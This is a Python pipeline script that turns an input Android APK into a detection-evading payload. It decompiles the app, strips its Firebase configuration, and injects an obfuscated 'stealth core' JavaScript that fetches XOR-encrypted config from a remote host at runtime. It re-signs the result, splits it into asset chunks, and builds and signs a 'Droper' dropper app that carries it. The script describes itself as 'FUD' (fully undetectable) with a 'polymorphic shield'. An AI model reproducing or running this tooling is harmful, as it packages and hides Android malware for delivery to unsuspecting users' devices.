#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
One-shot: input/*.apk -> encrypt (Firebase FUD) -> signed base -> split -> Droper build -> signed dropper.
Put your base APK in fur aear/input/ and run:  python auto_pipeline.py
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import re
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parent


def log(msg: str) -> None:
    print(msg, flush=True)


def load_pipeline_config() -> dict:
    p = ROOT / "pipeline_config.json"
    if not p.is_file():
        raise FileNotFoundError(f"Missing {p}")
    cfg = json.loads(p.read_text(encoding="utf-8"))
    sdk = cfg.get("android_sdk", "")
    if "%LOCALAPPDATA%" in sdk:
        sdk = sdk.replace("%LOCALAPPDATA%", os.environ.get("LOCALAPPDATA", ""))
    cfg["android_sdk"] = sdk.replace("/", os.sep)
    for k in ("apktool", "signer"):
        rel = cfg["tools"][k]
        cfg["tools"][k] = str((ROOT / rel).resolve())
    cfg["google_services_json"] = str((ROOT / cfg["google_services_json"]).resolve())
    cfg["droper_root"] = str((ROOT / cfg["droper_project"] / "Droper").resolve())
    cfg["assets_path"] = str(Path(cfg["droper_root"]) / "app" / "src" / "main" / "assets")
    return cfg


def expand_env_path(p: str) -> str:
    return os.path.expandvars(os.path.expanduser(p))


def run(cmd: list[str] | str, cwd: str | None = None, env: dict | None = None) -> subprocess.CompletedProcess:
    if isinstance(cmd, str):
        shell = True
    else:
        shell = False
    e = os.environ.copy()
    if env:
        e.update(env)
    log(f"> {cmd if isinstance(cmd, str) else ' '.join(cmd)}")
    return subprocess.run(
        cmd,
        cwd=cwd,
        env=e,
        shell=shell,
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
    )


def find_build_tools(sdk: str) -> str:
    bt_root = Path(sdk) / "build-tools"
    if not bt_root.is_dir():
        raise FileNotFoundError(f"build-tools not found under {sdk}")
    versions = sorted([d for d in bt_root.iterdir() if d.is_dir()], reverse=True)
    if not versions:
        raise FileNotFoundError("No build-tools version installed")
    return str(versions[0])


def find_input_apk(input_dir: Path) -> Path:
    apks = sorted(input_dir.glob("*.apk"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not apks:
        raise FileNotFoundError(f"No .apk in {input_dir}")
    return apks[0]


def parse_google_services(path: Path) -> dict:
    data = json.loads(path.read_text(encoding="utf-8"))
    pi = data.get("project_info", {})
    client = data["client"][0]
    api_key = client["api_key"][0]["current_key"]
    app_id = client["client_info"]["mobilesdk_app_id"]
    return {
        "firebase_database_url": pi.get("firebase_url", ""),
        "google_api_key": api_key,
        "google_app_id": app_id,
        "project_id": pi.get("project_id", ""),
        "gcm_defaultSenderId": pi.get("project_number", ""),
    }


def generate_polymorphic_shield():
    key = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=24))
    ops = []
    for _ in range(5):
        ops.append((random.choice(["add", "sub", "xor"]), random.randint(1, 255)))
    return key, ops


def encrypt_val(v: str, p_key: str, p_ops) -> str:
    if not v:
        return ""
    b = bytearray(v.encode("utf-8"))
    for i in range(len(b)):
        for op, val in p_ops:
            if op == "add":
                b[i] = (b[i] + val) & 0xFF
            elif op == "sub":
                b[i] = (b[i] - val) & 0xFF
            elif op == "xor":
                b[i] = b[i] ^ val
        b[i] ^= ord(p_key[i % len(p_key)])
    return base64.b64encode(b).decode("utf-8")


def patch_decode_dir(decode_dir: Path, firebase: dict, host_url: str, config_out: Path) -> None:
    p_key, p_ops = generate_polymorphic_shield()
    enc = {k: encrypt_val(v, p_key, p_ops) for k, v in firebase.items()}
    config_out.parent.mkdir(parents=True, exist_ok=True)
    config_out.write_text(json.dumps(enc, indent=2), encoding="utf-8")

    strings_xml = decode_dir / "res" / "values" / "strings.xml"
    public_xml = decode_dir / "res" / "values" / "public.xml"
    manifest_xml = decode_dir / "AndroidManifest.xml"
    keys_purge = [
        "firebase_database_url",
        "google_api_key",
        "google_app_id",
        "project_id",
        "gcm_defaultSenderId",
        "google_storage_bucket",
        "google_crash_reporting_api_key",
    ]

    if strings_xml.is_file():
        data = strings_xml.read_text(encoding="utf-8")
        for k in keys_purge:
            data = re.sub(r'\s*<string name="' + k + r'">.*?</string>', "", data)
        strings_xml.write_text(data, encoding="utf-8")

    if public_xml.is_file():
        data = public_xml.read_text(encoding="utf-8")
        for k in keys_purge:
            data = re.sub(r'\s*<public type="string" name="' + k + r'" id=".*?" />', "", data)
        public_xml.write_text(data, encoding="utf-8")

    if manifest_xml.is_file():
        manifest = manifest_xml.read_text(encoding="utf-8")
        manifest = re.sub(
            r'<provider[^>]*?name="com\.google\.firebase\.provider\.FirebaseInitProvider"[^>]*?/>',
            "",
            manifest,
        )
        manifest_xml.write_text(manifest, encoding="utf-8")

    js_ops = ""
    for op, val in reversed(p_ops):
        if op == "add":
            js_ops += f"v = (v - {val}) & 0xFF;"
        elif op == "sub":
            js_ops += f"v = (v + {val}) & 0xFF;"
        elif op == "xor":
            js_ops += f"v = v ^ {val};"

    url_bytes = list(host_url.encode("utf-8"))
    url_xor = random.randint(1, 255)
    url_obf = [b ^ url_xor for b in url_bytes]

    ghost_js = f"""
// --- ANTIGRAVITY STEALTH CORE ---
(function(){{
  const _u = [{",".join(map(str, url_obf))}].map(b => String.fromCharCode(b ^ {url_xor})).join("");
  const _k = "{p_key}";
  async function _f(){{
    try {{
      const r = await fetch(_u);
      const c = await r.json();
      const _d = (s) => {{
        if(!s) return "";
        let b6 = atob(s);
        let res = "";
        for(let i=0; i<b6.length; i++){{
          let v = b6.charCodeAt(i);
          {js_ops}
          v ^= _k.charCodeAt(i % _k.length);
          res += String.fromCharCode(v);
        }}
        return res;
      }};
      window.DB_BASE_URL = _d(c.firebase_database_url);
      window.FB_CONFIG = {{
        apiKey: _d(c.google_api_key),
        appId: _d(c.google_app_id),
        projectId: _d(c.project_id),
        databaseURL: window.DB_BASE_URL
      }};
      if(window.Android && window.Android.initSecure) window.Android.initSecure(JSON.stringify(window.FB_CONFIG));
    }} catch(e) {{}}
  }}
  _f();
}})();
"""
    app_js = decode_dir / "assets" / "app.js"
    if app_js.is_file():
        old = app_js.read_text(encoding="utf-8")
        old = re.sub(
            r"// --- ANTIGRAVITY STEALTH CORE ---[\s\S]*?(?=// ---|$)",
            "",
            old,
            count=1,
        )
        app_js.write_text(ghost_js + old, encoding="utf-8")
    else:
        app_js.parent.mkdir(parents=True, exist_ok=True)
        app_js.write_text(ghost_js, encoding="utf-8")


def sign_apk_uber(unsigned: Path, out_dir: Path, signer_jar: str) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    r = run(["java", "-jar", signer_jar, "--apks", str(unsigned), "--allowResign", "--out", str(out_dir)])
    if r.stdout:
        log(r.stdout)
    if r.returncode != 0:
        raise RuntimeError(f"uber-apk-signer failed: {r.stderr or r.stdout}")
    signed = sorted(out_dir.glob("*-aligned-debugSigned.apk"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not signed:
        signed = sorted(out_dir.glob("*.apk"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not signed:
        raise FileNotFoundError("Signer produced no APK")
    return signed[0]


def sign_apk_v2(src: Path, dst: Path, bt: str, ks_path: Path, alias: str, store_pass: str) -> None:
    zipalign = Path(bt) / ("zipalign.exe" if sys.platform.startswith("win") else "zipalign")
    apksigner = Path(bt) / ("apksigner.bat" if sys.platform.startswith("win") else "apksigner")
    aligned = dst.parent / "aligned-temp.apk"
    z = run([str(zipalign), "-f", "4", str(src), str(aligned)])
    if z.returncode != 0 or not aligned.is_file():
        raise RuntimeError(f"zipalign failed: {z.stdout}\n{z.stderr}")
    cmd = [
        str(apksigner),
        "sign",
        "--v1-signing-enabled",
        "false",
        "--v2-signing-enabled",
        "true",
        "--v3-signing-enabled",
        "true",
        "--ks",
        str(ks_path),
        "--ks-pass",
        f"pass:{store_pass}",
        "--key-pass",
        f"pass:{store_pass}",
        "--ks-key-alias",
        alias,
        "--out",
        str(dst),
        str(aligned),
    ]
    s = run(cmd)
    if s.stdout:
        log(s.stdout)
    if s.returncode != 0 or not dst.is_file():
        raise RuntimeError("apksigner failed")
    try:
        aligned.unlink()
    except OSError:
        pass


def ensure_keystore(ks_dir: Path, java_home: str) -> tuple[Path, str, str]:
    ks_dir.mkdir(parents=True, exist_ok=True)
    ks_path = ks_dir / "release.jks"
    meta_path = ks_dir / "release.json"
    if meta_path.is_file():
        meta = json.loads(meta_path.read_text(encoding="utf-8"))
        return Path(meta["keystore"]), meta["alias"], meta["storepass"]

    alias = f"astik{random.randint(10, 99)}"
    pwd = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18))
    keytool = Path(java_home) / "bin" / ("keytool.exe" if sys.platform.startswith("win") else "keytool")
    dname = "CN=Astik Build, OU=Mobile, O=Astik Labs, L=Mumbai, ST=Maharashtra, C=IN"
    cmd = [
        str(keytool),
        "-genkeypair",
        "-v",
        "-keystore",
        str(ks_path),
        "-storetype",
        "PKCS12",
        "-storepass",
        pwd,
        "-keypass",
        pwd,
        "-alias",
        alias,
        "-keyalg",
        "RSA",
        "-keysize",
        "2048",
        "-validity",
        "36500",
        "-dname",
        dname,
    ]
    r = run(cmd)
    if r.stdout:
        log(r.stdout)
    if not ks_path.is_file():
        raise RuntimeError("keytool failed to create keystore")
    meta = {"alias": alias, "keystore": str(ks_path), "storepass": pwd, "keypass": pwd}
    meta_path.write_text(json.dumps(meta, indent=2), encoding="utf-8")
    return ks_path, alias, pwd


def split_apk_to_assets(src: Path, assets: Path) -> None:
    assets.mkdir(parents=True, exist_ok=True)
    for f in assets.iterdir():
        if f.is_file():
            f.unlink()
    data = src.read_bytes()
    chunk = 1024 * 1024
    parts = (len(data) + chunk - 1) // chunk
    for i in range(parts):
        off = i * chunk
        (assets / f"base.apk.part{i:03d}").write_bytes(data[off : off + chunk])
    manifest = {
        "file": src.name,
        "size": len(data),
        "chunkSize": chunk,
        "parts": parts,
        "algo": "SHA-256",
        "hash": hashlib.sha256(data).hexdigest(),
    }
    (assets / "base.apk.parts.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    log(f"[OK] Split into {parts} parts -> {assets}")


def ensure_gradle_wrapper_jar(droper_root: str) -> None:
    jar = Path(droper_root) / "gradle" / "wrapper" / "gradle-wrapper.jar"
    if jar.is_file() and jar.stat().st_size > 10000:
        return
    jar.parent.mkdir(parents=True, exist_ok=True)
    import urllib.request

    url = "https://raw.githubusercontent.com/gradle/gradle/v8.7.0/gradle/wrapper/gradle-wrapper.jar"
    log(f"[INFO] Downloading gradle-wrapper.jar -> {jar}")
    urllib.request.urlretrieve(url, jar)


def ensure_android_local_properties(droper_root: str, android_sdk: str) -> None:
    props = Path(droper_root) / "local.properties"
    sdk_dir = android_sdk.replace("\\", "/")
    props.write_text(
        "## Auto-generated by auto_pipeline.py\nsdk.dir=" + sdk_dir + "\n",
        encoding="utf-8",
    )


def build_droper(droper_root: str, java_home: str, android_sdk: str) -> Path:
    ensure_gradle_wrapper_jar(droper_root)
    ensure_android_local_properties(droper_root, android_sdk)
    env = os.environ.copy()
    env["JAVA_HOME"] = java_home
    env["ANDROID_SDK_ROOT"] = android_sdk
    env["ANDROID_HOME"] = android_sdk
    gradlew = Path(droper_root) / ("gradlew.bat" if sys.platform.startswith("win") else "gradlew")
    if not gradlew.is_file():
        raise FileNotFoundError(f"gradlew not found in {droper_root}")
    r = run([str(gradlew), "assembleDebug"], cwd=droper_root, env=env)
    if r.stdout:
        log(r.stdout[-4000:] if len(r.stdout) > 4000 else r.stdout)
    if r.stderr:
        log(r.stderr[-4000:] if len(r.stderr) > 4000 else r.stderr)
    if r.returncode != 0:
        raise RuntimeError(f"Gradle build failed (code {r.returncode}): {(r.stderr or r.stdout)[-500:]}")
    debug_dir = Path(droper_root) / "app" / "build" / "outputs" / "apk" / "debug"
    apks = sorted(debug_dir.glob("*.apk"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not apks:
        raise FileNotFoundError("No APK in droper debug output")
    return apks[0]


def main() -> int:
    log("=== Astik auto pipeline (input -> encrypt -> dropper -> output) ===\n")
    cfg = load_pipeline_config()
    java_home = expand_env_path(cfg.get("java_home", os.environ.get("JAVA_HOME", "")))
    if not java_home or not Path(java_home).is_dir():
        log("[ERROR] Set java_home in pipeline_config.json")
        return 1

    input_dir = ROOT / cfg["input_dir"]
    output_dir = ROOT / cfg["output_dir"]
    work_root = ROOT / cfg["work_dir"] / datetime.now().strftime("%Y%m%d_%H%M%S")
    work_root.mkdir(parents=True, exist_ok=True)
    output_dir.mkdir(parents=True, exist_ok=True)

    gs_path = Path(cfg["google_services_json"])
    if not gs_path.is_file():
        log(f"[ERROR] google-services not found: {gs_path}")
        return 1

    firebase = parse_google_services(gs_path)
    host_url = cfg["config_host_url"]
    log(f"[INFO] Firebase project: {firebase.get('project_id')}")
    log(f"[INFO] Config host URL: {host_url}")
    log("[WARN] Push docs/config.json to GitHub, enable Pages (/docs), then build APK.\n")

    try:
        base_apk = find_input_apk(input_dir)
    except FileNotFoundError as e:
        log(f"[ERROR] {e}")
        return 1
    log(f"[1/6] Input APK: {base_apk.name} ({base_apk.stat().st_size / 1024 / 1024:.2f} MB)")

    apktool = cfg["tools"]["apktool"]
    signer = cfg["tools"]["signer"]
    decode_dir = work_root / "decode"
    if decode_dir.exists():
        shutil.rmtree(decode_dir)

    log("[2/6] Decompile + encrypt patch...")
    r = run(["java", "-jar", apktool, "d", str(base_apk), "-o", str(decode_dir), "-f"])
    if r.returncode != 0:
        log(r.stderr or r.stdout)
        return 1
    config_out = output_dir / "config.json"
    patch_decode_dir(decode_dir, firebase, host_url, config_out)
    shutil.copy2(config_out, ROOT / "config.json")
    docs_dir = ROOT / "docs"
    docs_dir.mkdir(parents=True, exist_ok=True)
    (docs_dir / ".nojekyll").touch(exist_ok=True)
    shutil.copy2(config_out, docs_dir / "config.json")
    log(f"       config.json -> {config_out}")
    log(f"       GitHub Pages -> {docs_dir / 'config.json'}")

    unsigned = work_root / "base_encrypted_unsigned.apk"
    r = run(["java", "-jar", apktool, "b", str(decode_dir), "-o", str(unsigned), "-f"])
    if r.returncode != 0:
        log(r.stderr or r.stdout)
        return 1

    sign_staging = work_root / "sign_stage"
    log("[3/6] Sign encrypted base APK...")
    base_signed = sign_apk_uber(unsigned, sign_staging, signer)
    out_base = output_dir / f"{base_apk.stem}_encrypted_signed.apk"
    shutil.copy2(base_signed, out_base)
    log(f"       -> {out_base}")

    log("[4/6] Split base into Droper assets...")
    split_apk_to_assets(out_base, Path(cfg["assets_path"]))

    log("[5/6] Build Droper (Gradle)...")
    droper_unsigned = build_droper(cfg["droper_root"], java_home, cfg["android_sdk"])

    log("[6/6] Sign Droper APK...")
    sdk = cfg["android_sdk"]
    bt = find_build_tools(sdk)
    ks_dir = work_root / "keystore"
    ks_path, alias, pwd = ensure_keystore(ks_dir, java_home)
    droper_signed = output_dir / f"dropper_{datetime.now().strftime('%Y%m%d_%H%M%S')}_signed.apk"
    sign_apk_v2(droper_unsigned, droper_signed, bt, ks_path, alias, pwd)
    shutil.copy2(droper_unsigned, output_dir / "dropper_unsigned_debug.apk")

    log("\n=== DONE ===")
    log(f"  Encrypted base : {out_base}")
    log(f"  Droper (final) : {droper_signed}")
    log(f"  config.json    : {config_out}  (host at {host_url})")
    log(f"  Work folder    : {work_root}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\nCancelled.")
        raise SystemExit(130)
